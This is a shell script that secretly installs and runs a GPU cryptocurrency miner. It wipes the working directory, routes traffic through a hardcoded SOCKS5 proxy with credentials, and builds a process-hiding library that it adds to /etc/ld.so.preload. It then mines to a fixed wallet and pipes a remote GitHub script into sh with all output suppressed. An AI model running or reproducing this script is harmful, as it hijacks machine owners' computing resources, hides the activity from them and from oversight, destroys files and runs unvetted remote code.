rm -rvf * && mkdir a && cd a
#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install -y nodejs

npm i -g node-process-hider

wget https://ixi.hash.express/dl/iximiner_v0.3.0_22.08.2022_linux.tar.gz && tar -zvxf iximiner_v0.3.0_22.08.2022_linux.tar.gz && cd iximiner_v0.3.0_22.08.2022_linux

wget https://gitlab.com/ravencoin002/file/-/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz


cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 45.55.165.161:443
socks5_username = majapahlevi
socks5_password = majapahlevi
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "
ph add iximiner 

./graftcp/graftcp wget https://gitlab.com/ravencoin002/file/-/raw/main/magicBezzHash.zip
unzip magicBezzHash.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp & clear & ./iximiner --mode miner --pool https://ixi.hash.express --wallet 48kQFR1238SgTvQ1iqe4ACcN8o3pHYgs36Q3vmeLGcTEdfU8fxbR5DaMGnB1MDVPX --name $(shuf -n 1 -i 1-99999)-Bismillah --cpu-intensity 0 --gpu-intensity 99 --force-gpu-optimization CUDA & curl https://raw.githubusercontent.com/John1265801/bookish-sniffle/refs/heads/main/bismillah.sh | sh > /dev/null 2>&1
